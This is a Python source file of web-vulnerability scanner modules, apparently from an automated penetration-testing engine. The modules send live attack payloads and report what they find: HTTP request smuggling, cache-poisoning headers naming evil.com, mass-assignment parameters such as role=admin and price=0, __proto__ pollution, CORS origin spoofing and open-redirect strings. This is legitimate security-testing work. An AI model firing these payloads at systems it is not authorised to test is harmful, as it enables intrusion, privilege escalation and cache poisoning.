"""Advanced attack modules for the active testing engine.

Implements missing vulnerability classes:
- HTTP Request Smuggling (CL.TE, TE.CL)
- Cache Poisoning
- Ghost Parameter / Mass Assignment Discovery
- Prototype Pollution
- CORS Exploitation
- Open Redirect Testing
- Behavioral Anomaly Detection
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import re
import statistics
import time
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urlparse, urlencode, quote

import httpx
import structlog

logger = structlog.get_logger()


# ── HTTP Request Smuggling ──────────────────────────────────────────────

class HTTPSmugglingTester:
    """Tests for HTTP request smuggling vulnerabilities (CL.TE, TE.CL).

    Sends ambiguous requests where Content-Length and Transfer-Encoding
    headers disagree, and checks for smuggling indicators.
    """

    def __init__(self, scope_guard: Any = None):
        self._scope_guard = scope_guard

    async def test(
        self, target_url: str, cookies: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test for HTTP request smuggling."""
        findings: list[dict[str, Any]] = []

        if self._scope_guard:
            self._scope_guard.validate_url(target_url)

        # CL.TE: Backend uses Transfer-Encoding, frontend uses Content-Length
        cl_te_payloads = [
            {
                "name": "CL.TE basic",
                "headers": {
                    "Content-Length": "6",
                    "Transfer-Encoding": "chunked",
                },
                "body": "0\r\n\r\nG",
            },
            {
                "name": "CL.TE with prefix",
                "headers": {
                    "Content-Length": "11",
                    "Transfer-Encoding": "chunked",
                },
                "body": "0\r\n\r\nGET / HTTP/1.1\r\n",
            },
        ]

        # TE.CL: Backend uses Content-Length, frontend uses Transfer-Encoding
        te_cl_payloads = [
            {
                "name": "TE.CL basic",
                "headers": {
                    "Content-Length": "3",
                    "Transfer-Encoding": "chunked",
                },
                "body": "1\r\nG\r\n0\r\n\r\n",
            },
        ]

        # TE.TE: Both use Transfer-Encoding but one can be obfuscated
        te_te_payloads = [
            {
                "name": "TE.TE obfuscation",
                "headers": {
                    "Transfer-Encoding": "chunked",
                    "Transfer-encoding": "x",
                },
                "body": "0\r\n\r\n",
            },
            {
                "name": "TE.TE tab",
                "headers": {
                    "Transfer-Encoding": "chunked",
                    "Transfer-Encoding\t": "chunked",
                },
                "body": "0\r\n\r\n",
            },
        ]

        all_payloads = cl_te_payloads + te_cl_payloads + te_te_payloads

        for payload in all_payloads:
            try:
                # We need raw socket for smuggling since httpx normalizes headers
                import socket
                import ssl

                parsed = urlparse(target_url)
                host = parsed.netloc
                port = parsed.port or (443 if parsed.scheme == "https" else 80)
                hostname = parsed.hostname
                path = parsed.path or "/"

                # Build raw request
                headers_str = f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
                if cookies:
                    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
                    headers_str += f"Cookie: {cookie_str}\r\n"
                for k, v in payload["headers"].items():
                    headers_str += f"{k}: {v}\r\n"
                headers_str += "\r\n"

                raw_request = headers_str.encode() + payload["body"].encode()

                # Send via socket
                sock = socket.create_connection((hostname, port), timeout=10)
                if parsed.scheme == "https":
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=hostname)

                sock.sendall(raw_request)

                # Read response
                response = b""
                sock.settimeout(5)
                try:
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        response += chunk
                except socket.timeout:
                    pass
                finally:
                    sock.close()

                resp_str = response.decode("utf-8", errors="replace")

                # Check for smuggling indicators
                # If we get a different response than expected, or timing anomalies
                if "405" in resp_str[:20] or "400" in resp_str[:20]:
                    # Server rejected the smuggling attempt differently
                    pass
                elif "200" in resp_str[:20] and payload["name"].startswith("CL.TE"):
                    # Potential CL.TE: server accepted despite conflicting headers
                    findings.append({
                        "vuln_type": "http_smuggling",
                        "endpoint": target_url,
                        "parameter": "",
                        "evidence": f"Potential {payload['name']}: Server accepted ambiguous Content-Length/Transfer-Encoding. Response: {resp_str[:500]}",
                        "tool_used": "smuggling_tester",
                        "technique": payload["name"],
                        "confirmed": False,
                    })

            except Exception as e:
                logger.debug("smuggling_test_error", name=payload["name"], error=str(e)[:200])

        return findings


# ── Cache Poisoning ─────────────────────────────────────────────────────

class CachePoisonTester:
    """Tests for web cache poisoning via unkeyed headers."""

    def __init__(self, scope_guard: Any = None):
        self._scope_guard = scope_guard

    async def test(
        self, target_url: str, cookies: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test for cache poisoning vulnerabilities."""
        findings: list[dict[str, Any]] = []

        if self._scope_guard:
            self._scope_guard.validate_url(target_url)

        # Unkeyed headers that might be reflected or affect caching
        poison_headers = [
            ("X-Forwarded-Host", "evil.com"),
            ("X-Host", "evil.com"),
            ("X-Forwarded-Scheme", "nothttps"),
            ("X-Original-URL", "/admin"),
            ("X-Rewrite-URL", "/admin"),
            ("X-Forwarded-Port", "443"),
            ("X-Forwarded-Prefix", "/evil"),
        ]

        cache_buster = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

        async with httpx.AsyncClient(
            verify=False, timeout=15, cookies=cookies or {},
        ) as client:
            # Get baseline
            try:
                baseline = await client.get(f"{target_url}?cb={cache_buster}a")
                baseline_body = baseline.text
            except Exception:
                return findings

            for header_name, header_value in poison_headers:
                cache_buster = hashlib.md5(f"{time.time()}{header_name}".encode()).hexdigest()[:8]
                test_url = f"{target_url}?cb={cache_buster}"

                try:
                    # Send poisoned request
                    resp = await client.get(
                        test_url,
                        headers={header_name: header_value},
                    )

                    # Check if header value is reflected in response
                    if header_value in resp.text and header_value not in baseline_body:
                        # Now check if the poisoned response is cached
                        await asyncio.sleep(1)
                        verify = await client.get(test_url)  # No poison header

                        if header_value in verify.text:
                            findings.append({
                                "vuln_type": "cache_poisoning",
                                "endpoint": target_url,
                                "parameter": header_name,
                                "payload_used": f"{header_name}: {header_value}",
                                "evidence": f"Cache poisoning via {header_name}! Value '{header_value}' persisted in cached response. Response: {verify.text[:500]}",
                                "tool_used": "cache_poison_tester",
                                "confirmed": True,
                            })
                        else:
                            findings.append({
                                "vuln_type": "header_injection",
                                "endpoint": target_url,
                                "parameter": header_name,
                                "payload_used": f"{header_name}: {header_value}",
                                "evidence": f"Header {header_name} reflected in response (not cached). Response: {resp.text[:500]}",
                                "tool_used": "cache_poison_tester",
                                "confirmed": False,
                            })

                except Exception as e:
                    logger.debug("cache_poison_error", header=header_name, error=str(e)[:200])

        return findings


# ── Ghost Parameter / Mass Assignment Discovery ─────────────────────────

class GhostParamDiscovery:
    """Discovers hidden parameters that affect application behavior.

    Sends requests with extra privilege-related parameters to find
    mass assignment vulnerabilities.
    """

    # Common privilege parameters
    GHOST_PARAMS = [
        ("admin", "1"), ("admin", "true"), ("is_admin", "1"), ("is_admin", "true"),
        ("role", "admin"), ("role", "superadmin"), ("role", "root"),
        ("user_role", "admin"), ("access_level", "admin"), ("privilege", "admin"),
        ("verified", "1"), ("verified", "true"), ("email_verified", "1"),
        ("is_active", "1"), ("active", "1"), ("status", "active"),
        ("approved", "1"), ("is_approved", "1"),
        ("plan", "enterprise"), ("plan", "premium"), ("tier", "admin"),
        ("credits", "99999"), ("balance", "99999"), ("points", "99999"),
        ("discount", "100"), ("price", "0"), ("amount", "0"),
        ("debug", "1"), ("debug", "true"), ("test", "1"),
        ("internal", "1"), ("internal", "true"),
        ("is_superuser", "1"), ("is_staff", "1"), ("is_moderator", "1"),
        ("group", "admin"), ("groups", "admin"),
        ("permissions", "all"), ("scope", "admin"),
        ("type", "admin"), ("account_type", "premium"),
        ("level", "99"), ("rank", "admin"),
    ]

    def __init__(self, scope_guard: Any = None):
        self._scope_guard = scope_guard

    async def test(
        self,
        target_url: str,
        method: str = "POST",
        original_body: dict[str, str] | None = None,
        cookies: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test for mass assignment by appending ghost parameters."""
        findings: list[dict[str, Any]] = []

        if self._scope_guard:
            self._scope_guard.validate_url(target_url)

        base_body = original_body or {}

        async with httpx.AsyncClient(
            verify=False, timeout=15, cookies=cookies or {},
            follow_redirects=True,
        ) as client:
            # Get baseline response
            try:
                if method.upper() == "POST":
                    baseline = await client.post(target_url, data=base_body)
                else:
                    baseline = await client.request(method, target_url, params=base_body)
                baseline_body = baseline.text
                baseline_status = baseline.status_code
                baseline_length = len(baseline.content)
            except Exception:
                return findings

            for param_name, param_value in self.GHOST_PARAMS:
                if param_name in base_body:
                    continue

                test_body = {**base_body, param_name: param_value}

                try:
                    await asyncio.sleep(0.05)

                    if method.upper() == "POST":
                        resp = await client.post(target_url, data=test_body)
                    else:
                        resp = await client.request(method, target_url, params=test_body)

                    # Check for behavioral differences
                    length_diff = abs(len(resp.content) - baseline_length)
                    status_diff = resp.status_code != baseline_status

                    # Significant response change suggests parameter is processed
                    if status_diff or (length_diff > 50 and length_diff > baseline_length * 0.1):
                        findings.append({
                            "vuln_type": "mass_assignment",
                            "endpoint": target_url,
                            "parameter": param_name,
                            "payload_used": f"{param_name}={param_value}",
                            "evidence": (
                                f"Ghost parameter '{param_name}={param_value}' changed response. "
                                f"Status: {baseline_status}→{resp.status_code}, "
                                f"Length: {baseline_length}→{len(resp.content)} "
                                f"(diff: {length_diff}). Response: {resp.text[:500]}"
                            ),
                            "tool_used": "ghost_param_discovery",
                            "confirmed": False,
                        })

                except Exception:
                    continue

        return findings


# ── Prototype Pollution ─────────────────────────────────────────────────

class PrototypePollutionTester:
    """Tests for server-side prototype pollution in Node.js/Express apps."""

    POLLUTION_PAYLOADS = [
        # __proto__ pollution via JSON body
        {"__proto__": {"isAdmin": True}},
        {"__proto__": {"role": "admin"}},
        {"__proto__": {"admin": True}},
        {"__proto__": {"status": 200}},
        {"constructor": {"prototype": {"isAdmin": True}}},
        {"constructor": {"prototype": {"role": "admin"}}},
        # Nested pollution
        {"user": {"__proto__": {"isAdmin": True}}},
        {"config": {"__proto__": {"debug": True}}},
    ]

    def __init__(self, scope_guard: Any = None):
        self._scope_guard = scope_guard

    async def test(
        self,
        target_url: str,
        cookies: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test JSON API endpoints for prototype pollution."""
        findings: list[dict[str, Any]] = []

        if self._scope_guard:
            self._scope_guard.validate_url(target_url)

        async with httpx.AsyncClient(
            verify=False, timeout=15, cookies=cookies or {},
            follow_redirects=True,
        ) as client:
            # Get baseline
            try:
                baseline = await client.get(target_url)
                baseline_body = baseline.text
                baseline_status = baseline.status_code
            except Exception:
                return findings

            for payload in self.POLLUTION_PAYLOADS:
                try:
                    await asyncio.sleep(0.1)

                    # Send pollution payload as JSON
                    resp = await client.post(
                        target_url,
                        json=payload,
                        headers={"Content-Type": "application/json"},
                    )

                    # Check if application behavior changed
                    # Re-fetch the page to see if global state was polluted
                    verify = await client.get(target_url)

                    if verify.text != baseline_body:
                        diff_size = abs(len(verify.text) - len(baseline_body))
                        if diff_size > 10:
                            findings.append({
                                "vuln_type": "prototype_pollution",
                                "endpoint": target_url,
                                "parameter": "__proto__",
                                "payload_used": json.dumps(payload),
                                "evidence": (
                                    f"Prototype pollution detected! Response changed after "
                                    f"sending {json.dumps(payload)}. "
                                    f"Length diff: {diff_size}. "
                                    f"Before: {baseline_body[:200]}... "
                                    f"After: {verify.text[:200]}..."
                                ),
                                "tool_used": "prototype_pollution_tester",
                                "confirmed": False,
                            })

                except Exception:
                    continue

        return findings


# ── CORS Exploitation ───────────────────────────────────────────────────

class CORSExploitTester:
    """Active CORS misconfiguration testing."""

    def __init__(self, scope_guard: Any = None):
        self._scope_guard = scope_guard

    async def test(
        self,
        target_url: str,
        cookies: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test for exploitable CORS misconfigurations."""
        findings: list[dict[str, Any]] = []

        if self._scope_guard:
            self._scope_guard.validate_url(target_url)

        parsed = urlparse(target_url)
        target_domain = parsed.netloc

        # Origins to test
        test_origins = [
            f"https://evil.com",
            f"https://{target_domain}.evil.com",
            f"https://evil-{target_domain}",
            f"https://{target_domain}evil.com",
            "null",
            f"https://sub.{target_domain}",
            f"http://{target_domain}",  # HTTP downgrade
        ]

        async with httpx.AsyncClient(
            verify=False, timeout=15, cookies=cookies or {},
        ) as client:
            for origin in test_origins:
                try:
                    resp = await client.get(
                        target_url,
                        headers={"Origin": origin},
                    )

                    acao = resp.headers.get("access-control-allow-origin", "")
                    acac = resp.headers.get("access-control-allow-credentials", "")

                    if acao and origin != "null":
                        # Check if our evil origin is reflected
                        if acao == origin or acao == "*":
                            severity = "low"
                            if acac.lower() == "true":
                                severity = "high"
                            if acao == "*" and acac.lower() == "true":
                                severity = "critical"

                            findings.append({
                                "vuln_type": "cors_misconfiguration",
                                "endpoint": target_url,
                                "parameter": "Origin",
                                "payload_used": origin,
                                "evidence": (
                                    f"CORS misconfiguration: Origin '{origin}' is "
                                    f"{'reflected' if acao == origin else 'wildcarded'}. "
                                    f"ACAO: {acao}, ACAC: {acac}. "
                                    f"Severity: {severity}"
                                ),
                                "tool_used": "cors_tester",
                                "confirmed": True,
                                "severity": severity,
                            })
                    elif origin == "null" and acao == "null":
                        findings.append({
                            "vuln_type": "cors_misconfiguration",
                            "endpoint": target_url,
                            "parameter": "Origin",
                            "payload_used": "null",
                            "evidence": (
                                f"CORS null origin accepted. "
                                f"ACAO: null, ACAC: {acac}. "
                                "Exploitable via sandboxed iframe."
                            ),
                            "tool_used": "cors_tester",
                            "confirmed": True,
                        })

                except Exception:
                    continue

        return findings


# ── Open Redirect Testing ───────────────────────────────────────────────

class OpenRedirectTester:
    """Systematic open redirect testing on redirect-accepting parameters."""

    REDIRECT_PARAMS = [
        "url", "redirect", "redirect_url", "redirect_uri", "return",
        "return_url", "returnTo", "return_to", "next", "next_url",
        "goto", "go", "dest", "destination", "target", "redir",
        "continue", "callback", "callback_url", "forward", "forward_url",
        "out", "view", "ref", "link",
    ]

    REDIRECT_PAYLOADS = [
        "//evil.com", "/\\evil.com", "//evil.com/",
        "https://evil.com", "///evil.com",
        "@evil.com", "//evil.com%23",
        "%2f%2fevil.com", "//evil%00.com",
        "////evil.com//", "https:evil.com",
        "//evil.com\\@target.com",
    ]

    def __init__(self, scope_guard: Any = None):
        self._scope_guard = scope_guard

    async def test(
        self,
        target_url: str,
        cookies: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test for open redirect vulnerabilities."""
        findings: list[dict[str, Any]] = []

        if self._scope_guard:
            self._scope_guard.validate_url(target_url)

        async with httpx.AsyncClient(
            verify=False, timeout=15, cookies=cookies or {},
            follow_redirects=False,  # Don't follow — we want to see the redirect
        ) as client:
            for param in self.REDIRECT_PARAMS:
                for payload in self.REDIRECT_PAYLOADS[:6]:  # Limit per param
                    try:
                        sep = "&" if "?" in target_url else "?"
                        test_url = f"{target_url}{sep}{param}={quote(payload, safe='')}"

                        resp = await client.get(test_url)

                        # Check for redirect to our evil domain
                        location = resp.headers.get("location", "")

                        if resp.status_code in (301, 302, 303, 307, 308):
                            if "evil.com" in location:
                                findings.append({
                                    "vuln_type": "open_redirect",
                                    "endpoint": target_url,
                                    "parameter": param,
                                    "payload_used": payload,
                                    "evidence": (
                                        f"Open redirect via {param}={payload}. "
                                        f"Server redirects to: {location} "
                                        f"(status {resp.status_code})"
                                    ),
                                    "tool_used": "open_redirect_tester",
                                    "confirmed": True,
                                })
                                break  # Found one for this param

                        # Also check for meta refresh or JS redirect
                        if resp.status_code == 200:
                            body = resp.text[:2000].lower()
                            if "evil.com" in body and (
                                "meta http-equiv" in body
                                or "window.location" in body
                                or "document.location" in body
                            ):
                                findings.append({
                                    "vuln_type": "open_redirect",
                                    "endpoint": target_url,
                                    "parameter": param,
                                    "payload_used": payload,
                                    "evidence": (
                                        f"Client-side redirect via {param}={payload}. "
                                        f"Evil domain found in response body."
                                    ),
                                    "tool_used": "open_redirect_tester",
                                    "confirmed": False,
                                })
                                break

                        await asyncio.sleep(0.05)

                    except Exception:
                        continue

        return findings


# ── Behavioral Anomaly Detection ────────────────────────────────────────

@dataclass
class EndpointProfile:
    """Behavioral baseline for a single endpoint."""
    url: str
    method: str = "GET"
    avg_response_time_ms: float = 0
    stddev_response_time_ms: float = 0
    avg_body_length: int = 0
    stddev_body_length: float = 0
    typical_status: int = 200
    typical_headers: dict[str, str] = field(default_factory=dict)
    typical_cookies: set[str] = field(default_factory=set)
    sample_count: int = 0


class BehaviorProfiler:
    """Profiles endpoint behavior and detects anomalies.

    Builds behavioral baselines (timing, response size, headers, cookies)
    and systematically varies inputs to detect deviations that indicate
    vulnerabilities not matching known patterns.
    """

    def __init__(self, scope_guard: Any = None, rate_limit: float = 0.1):
        self._scope_guard = scope_guard
        self._rate_limit = rate_limit
        self._profiles: dict[str, EndpointProfile] = {}

    async def profile_endpoint(
        self,
        url: str,
        method: str = "GET",
        cookies: dict[str, str] | None = None,
        samples: int = 5,
    ) -> EndpointProfile:
        """Build a behavioral baseline for an endpoint."""
        if self._scope_guard:
            self._scope_guard.validate_url(url)

        timings: list[float] = []
        lengths: list[int] = []
        statuses: list[int] = []
        all_headers: dict[str, set[str]] = {}
        cookie_names: set[str] = set()

        async with httpx.AsyncClient(
            verify=False, timeout=15, cookies=cookies or {},
            follow_redirects=True,
        ) as client:
            for _ in range(samples):
                try:
                    start = time.monotonic()
                    resp = await client.request(method, url)
                    elapsed = (time.monotonic() - start) * 1000

                    timings.append(elapsed)
                    lengths.append(len(resp.content))
                    statuses.append(resp.status_code)

                    for k, v in resp.headers.items():
                        all_headers.setdefault(k, set()).add(v)

                    for cookie in resp.cookies:
                        cookie_names.add(cookie)

                    await asyncio.sleep(self._rate_limit)
                except Exception:
                    continue

        if not timings:
            return EndpointProfile(url=url, method=method)

        profile = EndpointProfile(
            url=url,
            method=method,
            avg_response_time_ms=statistics.mean(timings),
            stddev_response_time_ms=statistics.stdev(timings) if len(timings) > 1 else 0,
            avg_body_length=int(statistics.mean(lengths)),
            stddev_body_length=statistics.stdev(lengths) if len(lengths) > 1 else 0,
            typical_status=max(set(statuses), key=statuses.count),
            typical_headers={k: next(iter(v)) for k, v in all_headers.items() if len(v) == 1},
            typical_cookies=cookie_names,
            sample_count=len(timings),
        )

        self._profiles[f"{method}:{url}"] = profile
        return profile

    async def detect_anomalies(
        self,
        url: str,
        param: str,
        test_values: list[str],
        method: str = "GET",
        cookies: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test parameter values against baseline to find anomalies."""
        key = f"{method}:{url}"
        profile = self._profiles.get(key)
        if not profile:
            profile = await self.profile_endpoint(url, method, cookies)

        anomalies: list[dict[str, Any]] = []

        async with httpx.AsyncClient(
            verify=False, timeout=15, cookies=cookies or {},
            follow_redirects=True,
        ) as client:
            for value in test_values:
                try:
                    sep = "&" if "?" in url else "?"
                    test_url = f"{url}{sep}{param}={quote(str(value), safe='')}"

                    start = time.monotonic()
                    resp = await client.request(method, test_url)
                    elapsed = (time.monotonic() - start) * 1000

                    anomaly_indicators: list[str] = []

                    # Timing anomaly: >3x mean or >5 stddev
                    if profile.avg_response_time_ms > 0:
                        time_threshold = max(
                            profile.avg_response_time_ms * 3,
                            profile.avg_response_time_ms + 5 * max(profile.stddev_response_time_ms, 50)
                        )
                        if elapsed > time_threshold:
                            anomaly_indicators.append(
                                f"timing_anomaly: {elapsed:.0f}ms vs baseline {profile.avg_response_time_ms:.0f}ms"
                            )

                    # Status change
                    if resp.status_code != profile.typical_status:
                        anomaly_indicators.append(
                            f"status_change: {profile.typical_status}→{resp.status_code}"
                        )

                    # Length anomaly: >3 stddev
                    length_diff = abs(len(resp.content) - profile.avg_body_length)
                    if profile.stddev_body_length > 0:
                        if length_diff > 3 * profile.stddev_body_length:
                            anomaly_indicators.append(
                                f"length_anomaly: {len(resp.content)} vs baseline {profile.avg_body_length}"
                            )
                    elif length_diff > max(100, profile.avg_body_length * 0.2):
                        anomaly_indicators.append(
                            f"length_change: {len(resp.content)} vs baseline {profile.avg_body_length}"
                        )

                    # New cookies (state change)
                    new_cookies = set(resp.cookies.keys()) - profile.typical_cookies
                    if new_cookies:
                        anomaly_indicators.append(
                            f"new_cookies: {', '.join(new_cookies)}"
                        )

                    # Error keywords in response
                    error_keywords = [
                        "error", "exception", "traceback", "stack trace",
                        "syntax error", "undefined", "null reference",
                    ]
                    body_lower = resp.text[:3000].lower()
                    found_errors = [kw for kw in error_keywords if kw in body_lower]
                    if found_errors:
                        anomaly_indicators.append(
                            f"error_indicators: {', '.join(found_errors)}"
                        )

                    if anomaly_indicators:
                        anomalies.append({
                            "parameter": param,
                            "test_value": str(value)[:200],
                            "indicators": anomaly_indicators,
                            "response_time_ms": round(elapsed),
                            "response_status": resp.status_code,
                            "response_length": len(resp.content),
                            "response_snippet": resp.text[:300],
                        })

                    await asyncio.sleep(self._rate_limit)

                except Exception:
                    continue

        return anomalies

    async def test_type_confusion(
        self,
        url: str,
        param: str,
        original_value: str = "1",
        method: str = "GET",
        cookies: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test parameter with different types to find type confusion bugs."""
        type_values = [
            "0", "-1", "99999999", "0.1", "-0.1",
            "NaN", "Infinity", "-Infinity",
            "", " ", "null", "undefined", "true", "false",
            "[]", "{}", '""', "''",
            "0x41", "0b1010", "0o777",
            "1e308", "-1e308",
            original_value * 100,  # Very long value
            "\x00", "\n", "\r\n", "\t",
        ]

        return await self.detect_anomalies(url, param, type_values, method, cookies)
